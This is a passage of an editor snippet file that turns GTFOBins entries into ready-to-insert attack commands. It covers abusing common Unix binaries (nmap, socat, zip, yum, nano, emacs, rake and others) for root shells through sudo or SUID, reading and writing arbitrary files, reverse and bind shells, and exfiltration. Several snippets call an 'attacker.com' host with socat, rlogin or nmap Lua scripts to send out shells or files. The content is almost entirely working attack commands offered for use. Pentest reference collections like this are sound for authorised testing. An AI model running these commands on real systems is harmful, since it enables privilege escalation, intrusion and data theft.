            "abuse ansible-test with shell",
            "",
            "```sh",
            "ansible-test shell${0}",
            "```"
        ],
        "description": "abuse ansible-test with shell"
    },
    "ansible-test sudo (gtfobins)": {
        "prefix": "ansible-test sudo",
        "body": [
            "abuse ansible-test with sudo",
            "",
            "```sh",
            "sudo ansible-test shell${0}",
            "```"
        ],
        "description": "abuse ansible-test with sudo"
    },
    "nmap shell (gtfobins)": {
        "prefix": "nmap shell",
        "body": [
            "abuse nmap with shell, The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
            "",
            "```sh",
            "nmap --interactive",
            "nmap> !sh${0}",
            "```"
        ],
        "description": "abuse nmap with shell - The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands."
    },
    "nmap non-interactive-reverse-shell (gtfobins)": {
        "prefix": "nmap non-interactive-reverse-shell",
        "body": [
            "abuse nmap with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "TF=\\$(mktemp)",
            "echo 'local s=require(\"socket\");",
            "local t=assert(s.tcp());",
            "t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "while true do",
            "  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "  local b=assert(f:read(\"*a\"));t:send(b);",
            "end;",
            "f:close();t:close();' > \\$TF",
            "nmap --script=\\$TF${0}",
            "```"
        ],
        "description": "abuse nmap with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell."
    },
    "nmap non-interactive-bind-shell (gtfobins)": {
        "prefix": "nmap non-interactive-bind-shell",
        "body": [
            "abuse nmap with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "TF=\\$(mktemp)",
            "echo 'local k=require(\"socket\");",
            "local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "local c=s:accept();",
            "while true do",
            "  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "  local b=assert(f:read(\"*a\"));c:send(b);",
            "end;c:close();f:close();' > \\$TF",
            "nmap --script=\\$TF${0}",
            "```"
        ],
        "description": "abuse nmap with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "nmap file-upload (gtfobins)": {
        "prefix": "nmap file-upload",
        "body": [
            "abuse nmap with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "TF=\\$(mktemp)",
            "echo 'local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "local d=f:read(\"*a\")",
            "io.close(f);",
            "local s=require(\"socket\");",
            "local t=assert(s.tcp());",
            "t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "t:send(d);",
            "t:close();' > \\$TF",
            "nmap --script=\\$TF${0}",
            "```"
        ],
        "description": "abuse nmap with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file."
    },
    "nmap file-download (gtfobins)": {
        "prefix": "nmap file-download",
        "body": [
            "abuse nmap with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "TF=\\$(mktemp)",
            "echo 'local k=require(\"socket\");",
            "local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "local c=s:accept();",
            "local d,x=c:receive(\"*a\");",
            "c:close();",
            "local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "f:write(d);",
            "io.close(f);' > \\$TF",
            "nmap --script=\\$TF${0}",
            "```"
        ],
        "description": "abuse nmap with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file."
    },
    "nmap file-write (gtfobins)": {
        "prefix": "nmap file-write",
        "body": [
            "abuse nmap with file-write, The payload appears inside the regular nmap output.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "nmap -oG=\\$LFILE DATA${0}",
            "```"
        ],
        "description": "abuse nmap with file-write - The payload appears inside the regular nmap output."
    },
    "nmap file-read (gtfobins)": {
        "prefix": "nmap file-read",
        "body": [
            "abuse nmap with file-read, The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.",
            "",
            "```sh",
            "nmap -iL ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse nmap with file-read - The file is actually parsed as a list of hosts/networks, lines are leaked through error messages."
    },
    "nmap sudo (gtfobins)": {
        "prefix": "nmap sudo",
        "body": [
            "abuse nmap with sudo, The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
            "",
            "```sh",
            "sudo nmap --interactive",
            "nmap> !sh${0}",
            "```"
        ],
        "description": "abuse nmap with sudo - The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands."
    },
    "nmap limited-suid (gtfobins)": {
        "prefix": "nmap limited-suid",
        "body": [
            "abuse nmap with limited-suid, Input echo is disabled.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'os.execute(\"/bin/sh\")' > \\$TF",
            "./nmap --script=\\$TF${0}",
            "```"
        ],
        "description": "abuse nmap with limited-suid - Input echo is disabled."
    },
    "nmap suid (gtfobins)": {
        "prefix": "nmap suid",
        "body": [
            "abuse nmap with suid, The payload appears inside the regular nmap output.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "./nmap -oG=\\$LFILE DATA${0}",
            "```"
        ],
        "description": "abuse nmap with suid - The payload appears inside the regular nmap output."
    },
    "more shell (gtfobins)": {
        "prefix": "more shell",
        "body": [
            "abuse more with shell",
            "",
            "```sh",
            "TERM= more /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse more with shell"
    },
    "more file-read (gtfobins)": {
        "prefix": "more file-read",
        "body": [
            "abuse more with file-read",
            "",
            "```sh",
            "more ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse more with file-read"
    },
    "more suid (gtfobins)": {
        "prefix": "more suid",
        "body": [
            "abuse more with suid",
            "",
            "```sh",
            "./more ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse more with suid"
    },
    "more sudo (gtfobins)": {
        "prefix": "more sudo",
        "body": [
            "abuse more with sudo",
            "",
            "```sh",
            "TERM= sudo more /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse more with sudo"
    },
    "ptx file-read (gtfobins)": {
        "prefix": "ptx file-read",
        "body": [
            "abuse ptx with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ptx -w 5000 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ptx with file-read"
    },
    "ptx suid (gtfobins)": {
        "prefix": "ptx suid",
        "body": [
            "abuse ptx with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ptx -w 5000 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ptx with suid"
    },
    "ptx sudo (gtfobins)": {
        "prefix": "ptx sudo",
        "body": [
            "abuse ptx with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ptx -w 5000 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ptx with sudo"
    },
    "ionice shell (gtfobins)": {
        "prefix": "ionice shell",
        "body": [
            "abuse ionice with shell",
            "",
            "```sh",
            "ionice /bin/sh${0}",
            "```"
        ],
        "description": "abuse ionice with shell"
    },
    "ionice suid (gtfobins)": {
        "prefix": "ionice suid",
        "body": [
            "abuse ionice with suid",
            "",
            "```sh",
            "./ionice /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse ionice with suid"
    },
    "ionice sudo (gtfobins)": {
        "prefix": "ionice sudo",
        "body": [
            "abuse ionice with sudo",
            "",
            "```sh",
            "sudo ionice /bin/sh${0}",
            "```"
        ],
        "description": "abuse ionice with sudo"
    },
    "as file-read (gtfobins)": {
        "prefix": "as file-read",
        "body": [
            "abuse as with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "as @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse as with file-read"
    },
    "as suid (gtfobins)": {
        "prefix": "as suid",
        "body": [
            "abuse as with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./as @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse as with suid"
    },
    "as sudo (gtfobins)": {
        "prefix": "as sudo",
        "body": [
            "abuse as with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo as @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse as with sudo"
    },
    "emacs shell (gtfobins)": {
        "prefix": "emacs shell",
        "body": [
            "abuse emacs with shell",
            "",
            "```sh",
            "emacs -Q -nw --eval '(term \"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse emacs with shell"
    },
    "emacs file-write (gtfobins)": {
        "prefix": "emacs file-write",
        "body": [
            "abuse emacs with file-write",
            "",
            "```sh",
            "emacs ${1:file_to_write}",
            "DATA",
            "C-x C-s${0}",
            "```"
        ],
        "description": "abuse emacs with file-write"
    },
    "emacs file-read (gtfobins)": {
        "prefix": "emacs file-read",
        "body": [
            "abuse emacs with file-read",
            "",
            "```sh",
            "emacs ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse emacs with file-read"
    },
    "emacs suid (gtfobins)": {
        "prefix": "emacs suid",
        "body": [
            "abuse emacs with suid",
            "",
            "```sh",
            "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'${0}",
            "```"
        ],
        "description": "abuse emacs with suid"
    },
    "emacs sudo (gtfobins)": {
        "prefix": "emacs sudo",
        "body": [
            "abuse emacs with sudo",
            "",
            "```sh",
            "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse emacs with sudo"
    },
    "vipw suid (gtfobins)": {
        "prefix": "vipw suid",
        "body": [
            "abuse vipw with suid",
            "",
            "```sh",
            "./vipw${0}",
            "```"
        ],
        "description": "abuse vipw with suid"
    },
    "vipw sudo (gtfobins)": {
        "prefix": "vipw sudo",
        "body": [
            "abuse vipw with sudo",
            "",
            "```sh",
            "sudo vipw${0}",
            "```"
        ],
        "description": "abuse vipw with sudo"
    },
    "socat shell (gtfobins)": {
        "prefix": "socat shell",
        "body": [
            "abuse socat with shell, The resulting shell is not a proper TTY shell and lacks the prompt.",
            "",
            "```sh",
            "socat stdin exec:/bin/sh${0}",
            "```"
        ],
        "description": "abuse socat with shell - The resulting shell is not a proper TTY shell and lacks the prompt."
    },
    "socat reverse-shell (gtfobins)": {
        "prefix": "socat reverse-shell",
        "body": [
            "abuse socat with reverse-shell, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "socat tcp-connect:\\$RHOST:\\$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane${0}",
            "```"
        ],
        "description": "abuse socat with reverse-shell - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "socat bind-shell (gtfobins)": {
        "prefix": "socat bind-shell",
        "body": [
            "abuse socat with bind-shell, Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "socat TCP-LISTEN:\\$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane${0}",
            "```"
        ],
        "description": "abuse socat with bind-shell - Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell."
    },
    "socat file-upload (gtfobins)": {
        "prefix": "socat file-upload",
        "body": [
            "abuse socat with file-upload, Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "socat -u file:\\$LFILE tcp-connect:\\$RHOST:\\$RPORT${0}",
            "```"
        ],
        "description": "abuse socat with file-upload - Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file."
    },
    "socat file-download (gtfobins)": {
        "prefix": "socat file-download",
        "body": [
            "abuse socat with file-download, Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_save}",
            "socat -u tcp-connect:\\$RHOST:\\$RPORT open:\\$LFILE,creat${0}",
            "```"
        ],
        "description": "abuse socat with file-download - Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file."
    },
    "socat file-read (gtfobins)": {
        "prefix": "socat file-read",
        "body": [
            "abuse socat with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "socat -u \"file:\\$LFILE\" -${0}",
            "```"
        ],
        "description": "abuse socat with file-read"
    },
    "socat file-write (gtfobins)": {
        "prefix": "socat file-write",
        "body": [
            "abuse socat with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "socat -u 'exec:echo DATA' \"open:\\$LFILE,creat\"${0}",
            "```"
        ],
        "description": "abuse socat with file-write"
    },
    "socat sudo (gtfobins)": {
        "prefix": "socat sudo",
        "body": [
            "abuse socat with sudo, The resulting shell is not a proper TTY shell and lacks the prompt.",
            "",
            "```sh",
            "sudo socat stdin exec:/bin/sh${0}",
            "```"
        ],
        "description": "abuse socat with sudo - The resulting shell is not a proper TTY shell and lacks the prompt."
    },
    "socat limited-suid (gtfobins)": {
        "prefix": "socat limited-suid",
        "body": [
            "abuse socat with limited-suid, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "./socat tcp-connect:\\$RHOST:\\$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane${0}",
            "```"
        ],
        "description": "abuse socat with limited-suid - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "zip file-read (gtfobins)": {
        "prefix": "zip file-read",
        "body": [
            "abuse zip with file-read",
            "",
            "```sh",
            "LFILE=file-to-read",
            "TF=\\$(mktemp -u)",
            "zip \\$TF \\$LFILE",
            "unzip -p \\$TF${0}",
            "```"
        ],
        "description": "abuse zip with file-read"
    },
    "zip shell (gtfobins)": {
        "prefix": "zip shell",
        "body": [
            "abuse zip with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "zip \\$TF /etc/hosts -T -TT 'sh #'",
            "rm \\$TF${0}",
            "```"
        ],
        "description": "abuse zip with shell"
    },
    "zip sudo (gtfobins)": {
        "prefix": "zip sudo",
        "body": [
            "abuse zip with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "sudo zip \\$TF /etc/hosts -T -TT 'sh #'",
            "sudo rm \\$TF${0}",
            "```"
        ],
        "description": "abuse zip with sudo"
    },
    "zip limited-suid (gtfobins)": {
        "prefix": "zip limited-suid",
        "body": [
            "abuse zip with limited-suid",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "./zip \\$TF /etc/hosts -T -TT 'sh #'",
            "sudo rm \\$TF${0}",
            "```"
        ],
        "description": "abuse zip with limited-suid"
    },
    "yum file-download (gtfobins)": {
        "prefix": "yum file-download",
        "body": [
            "abuse yum with file-download, Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RFILE=file_to_get.rpm",
            "yum install http://\\$RHOST/\\$RFILE${0}",
            "```"
        ],
        "description": "abuse yum with file-download - Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`."
    },
    "yum sudo (gtfobins)": {
        "prefix": "yum sudo",
        "body": [
            "abuse yum with sudo, \nSpawn interactive root shell by loading a custom plugin.\n",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "cat >\\$TF/x<<EOF",
            "[main]",
            "plugins=1",
            "pluginpath=\\$TF",
            "pluginconfpath=\\$TF",
            "EOF",
            "cat >\\$TF/y.conf<<EOF",
            "[main]",
            "enabled=1",
            "EOF",
            "cat >\\$TF/y.py<<EOF",
            "import os",
            "import yum",
            "from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE",
            "requires_api_version='2.1'",
            "def init_hook(conduit):",
            "  os.execl('/bin/sh','/bin/sh')",
            "EOF",
            "sudo yum -c \\$TF/x --enableplugin=y${0}",
            "```"
        ],
        "description": "abuse yum with sudo - \nSpawn interactive root shell by loading a custom plugin.\n"
    },
    "check_cups file-read (gtfobins)": {
        "prefix": "check_cups file-read",
        "body": [
            "abuse check_cups with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "check_cups --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_cups with file-read"
    },
    "check_cups sudo (gtfobins)": {
        "prefix": "check_cups sudo",
        "body": [
            "abuse check_cups with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo check_cups --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_cups with sudo"
    },
    "rlogin file-upload (gtfobins)": {
        "prefix": "rlogin file-upload",
        "body": [
            "abuse rlogin with file-upload, \nSend contents of a file to a TCP port. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker system to capture the contents.\n\n\n\n`rlogin` hangs waiting for the remote peer to close the socket.\n\n\n\nThe file is corrupted by leading and trailing spurious data.\n",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "rlogin -l \"\\$(cat \\$LFILE)\" -p \\$RPORT \\$RHOST${0}",
            "```"
        ],
        "description": "abuse rlogin with file-upload - \nSend contents of a file to a TCP port. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker system to capture the contents.\n\n\n\n`rlogin` hangs waiting for the remote peer to close the socket.\n\n\n\nThe file is corrupted by leading and trailing spurious data.\n"
    },
    "varnishncsa sudo (gtfobins)": {
        "prefix": "varnishncsa sudo",
        "body": [
            "abuse varnishncsa with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "sudo varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse varnishncsa with sudo"
    },
    "varnishncsa suid (gtfobins)": {
        "prefix": "varnishncsa suid",
        "body": [
            "abuse varnishncsa with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse varnishncsa with suid"
    },
    "rake file-read (gtfobins)": {
        "prefix": "rake file-read",
        "body": [
            "abuse rake with file-read, The file is actually parsed and the first wrong line is returned in an error message.",
            "",
            "```sh",
            "LFILE=file-to-read",
            "rake -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse rake with file-read - The file is actually parsed and the first wrong line is returned in an error message."
    },
    "rake shell (gtfobins)": {
        "prefix": "rake shell",
        "body": [
            "abuse rake with shell",
            "",
            "```sh",
            "rake -p '`/bin/sh 1>&0`'${0}",
            "```"
        ],
        "description": "abuse rake with shell"
    },
    "rake sudo (gtfobins)": {
        "prefix": "rake sudo",
        "body": [
            "abuse rake with sudo",
            "",
            "```sh",
            "sudo rake -p '`/bin/sh 1>&0`'${0}",
            "```"
        ],
        "description": "abuse rake with sudo"
    },
    "rake limited-suid (gtfobins)": {
        "prefix": "rake limited-suid",
        "body": [
            "abuse rake with limited-suid",
            "",
            "```sh",
            "./rake -p '`/bin/sh 1>&0`'${0}",
            "```"
        ],
        "description": "abuse rake with limited-suid"
    },
    "sash shell (gtfobins)": {
        "prefix": "sash shell",
        "body": [
            "abuse sash with shell",
            "",
            "```sh",
            "sash${0}",
            "```"
        ],
        "description": "abuse sash with shell"
    },
    "sash suid (gtfobins)": {
        "prefix": "sash suid",
        "body": [
            "abuse sash with suid",
            "",
            "```sh",
            "./sash${0}",
            "```"
        ],
        "description": "abuse sash with suid"
    },
    "sash sudo (gtfobins)": {
        "prefix": "sash sudo",
        "body": [
            "abuse sash with sudo",
            "",
            "```sh",
            "sudo sash${0}",
            "```"
        ],
        "description": "abuse sash with sudo"
    },
    "jq file-read (gtfobins)": {
        "prefix": "jq file-read",
        "body": [
            "abuse jq with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "jq -Rr . \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse jq with file-read"
    },
    "jq suid (gtfobins)": {
        "prefix": "jq suid",
        "body": [
            "abuse jq with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./jq -Rr . \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse jq with suid"
    },
    "jq sudo (gtfobins)": {
        "prefix": "jq sudo",
        "body": [
            "abuse jq with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo jq -Rr . \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse jq with sudo"
    },
    "check_statusfile file-read (gtfobins)": {
        "prefix": "check_statusfile file-read",
        "body": [
            "abuse check_statusfile with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "check_statusfile \\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_statusfile with file-read"
    },
    "check_statusfile sudo (gtfobins)": {
        "prefix": "check_statusfile sudo",
        "body": [
            "abuse check_statusfile with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo check_statusfile \\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_statusfile with sudo"
    },
    "nano shell (gtfobins)": {
        "prefix": "nano shell",
        "body": [
            "abuse nano with shell, The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
            "",
            "```sh",
            "nano -s /bin/sh",
            "/bin/sh",
            "^T${0}",
            "```"
        ],
        "description": "abuse nano with shell - The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed."
    },
    "nano file-write (gtfobins)": {
        "prefix": "nano file-write",
        "body": [
            "abuse nano with file-write",
            "",
            "```sh",
            "nano ${1:file_to_write}",
            "DATA",
            "^O${0}",
            "```"
        ],
        "description": "abuse nano with file-write"
    },
    "nano file-read (gtfobins)": {
        "prefix": "nano file-read",
        "body": [
            "abuse nano with file-read",
            "",
            "```sh",
            "nano ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse nano with file-read"
    },
    "nano limited-suid (gtfobins)": {
        "prefix": "nano limited-suid",
        "body": [
            "abuse nano with limited-suid, The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
            "",
            "```sh",
            "./nano -s /bin/sh",
            "/bin/sh",
            "^T${0}",
            "```"
        ],
        "description": "abuse nano with limited-suid - The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed."
    },
    "nano sudo (gtfobins)": {
        "prefix": "nano sudo",
        "body": [
            "abuse nano with sudo",
            "",
            "```sh",
            "sudo nano",
            "^R^X",
            "reset; sh 1>&0 2>&0${0}",
            "```"
        ],
        "description": "abuse nano with sudo"
    },
    "nasm file-read (gtfobins)": {
        "prefix": "nasm file-read",
        "body": [
            "abuse nasm with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nasm -@ \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nasm with file-read"
    },
    "nasm suid (gtfobins)": {
        "prefix": "nasm suid",
        "body": [
            "abuse nasm with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./nasm -@ \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nasm with suid"
    },
    "nasm sudo (gtfobins)": {
        "prefix": "nasm sudo",
        "body": [
            "abuse nasm with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo nasm -@ \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nasm with sudo"
    },
    "grc shell (gtfobins)": {
        "prefix": "grc shell",
        "body": [
            "abuse grc with shell",
            "",
            "```sh",
            "grc --pty /bin/sh${0}",
            "```"
        ],
        "description": "abuse grc with shell"
    },
    "grc sudo (gtfobins)": {
        "prefix": "grc sudo",
        "body": [
            "abuse grc with sudo",
            "",
            "```sh",
            "sudo grc --pty /bin/sh${0}",
            "```"
        ],
        "description": "abuse grc with sudo"
    },
    "uniq file-read (gtfobins)": {
        "prefix": "uniq file-read",
        "body": [
            "abuse uniq with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "uniq \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse uniq with file-read"
    },
    "uniq suid (gtfobins)": {
        "prefix": "uniq suid",
        "body": [
            "abuse uniq with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./uniq \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse uniq with suid"
    },
    "uniq sudo (gtfobins)": {
        "prefix": "uniq sudo",
        "body": [
            "abuse uniq with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo uniq \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse uniq with sudo"
    },
    "cobc shell (gtfobins)": {
        "prefix": "cobc shell",
        "body": [
            "abuse cobc with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' > \\$TF/x",
            "cobc -xFj --frelax-syntax-checks \\$TF/x${0}",
            "```"
        ],
        "description": "abuse cobc with shell"
    },
    "cobc sudo (gtfobins)": {
        "prefix": "cobc sudo",
        "body": [
            "abuse cobc with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' > \\$TF/x",
            "sudo cobc -xFj --frelax-syntax-checks \\$TF/x${0}",
            "```"
        ],
        "description": "abuse cobc with sudo"
    },
    "dstat shell (gtfobins)": {
        "prefix": "dstat shell",
        "body": [
            "abuse dstat with shell",
            "",
            "```sh",
            "mkdir -p ~/.dstat",
            "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >~/.dstat/dstat_xxx.py",
            "dstat --xxx${0}",
            "```"
        ],
        "description": "abuse dstat with shell"
    },
    "dstat sudo (gtfobins)": {
        "prefix": "dstat sudo",
        "body": [
            "abuse dstat with sudo",
            "",
            "```sh",
            "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py",
            "sudo dstat --xxx${0}",
            "```"
        ],
        "description": "abuse dstat with sudo"
    },
    "ghci shell (gtfobins)": {
        "prefix": "ghci shell",
        "body": [
            "abuse ghci with shell",
            "",
            "```sh",
            "ghci",
            "System.Process.callCommand \"/bin/sh\"${0}",
            "```"
        ],
        "description": "abuse ghci with shell"
    },
    "ghci sudo (gtfobins)": {
        "prefix": "ghci sudo",
        "body": [
            "abuse ghci with sudo",
            "",
            "```sh",
            "sudo ghci",
            "System.Process.callCommand \"/bin/sh\"${0}",
            "```"
        ],
        "description": "abuse ghci with sudo"
    },
    "rpmdb shell (gtfobins)": {
        "prefix": "rpmdb shell",
        "body": [
            "abuse rpmdb with shell",
            "",
            "```sh",
            "rpmdb --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmdb with shell"
    },
    "rpmdb limited-suid (gtfobins)": {
        "prefix": "rpmdb limited-suid",
        "body": [
            "abuse rpmdb with limited-suid",
            "",
            "```sh",
            "./rpmdb --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmdb with limited-suid"
    },
    "rpmdb sudo (gtfobins)": {
        "prefix": "rpmdb sudo",
        "body": [
            "abuse rpmdb with sudo",
            "",
            "```sh",
            "sudo rpmdb --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmdb with sudo"
    },
    "split file-read (gtfobins)": {
        "prefix": "split file-read",
        "body": [
            "abuse split with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp)",
            "split \\$LFILE \\$TF",
            "cat \\$TF*${0}",
            "```"
        ],
        "description": "abuse split with file-read"
    },
    "split file-write (gtfobins)": {
        "prefix": "split file-write",
        "body": [
            "abuse split with file-write, GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.",
            "",
            "```sh",
            "EXT=.xxx",
            "TF=\\$(mktemp)",
            "echo DATA >\\$TF",
            "split -b999m --additional-suffix \\$EXTENSION \\$TF${0}",
            "```"
        ],
        "description": "abuse split with file-write - GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough."
    },
    "split command (gtfobins)": {
        "prefix": "split command",
        "body": [
            "abuse split with command, Command execution using stdin (and close it directly).",
            "",
            "```sh",
            "COMMAND=id",
            "echo | split --filter=\\$COMMAND /dev/stdin${0}",
            "```"
        ],
        "description": "abuse split with command - Command execution using stdin (and close it directly)."
    },
    "split shell (gtfobins)": {
        "prefix": "split shell",
        "body": [
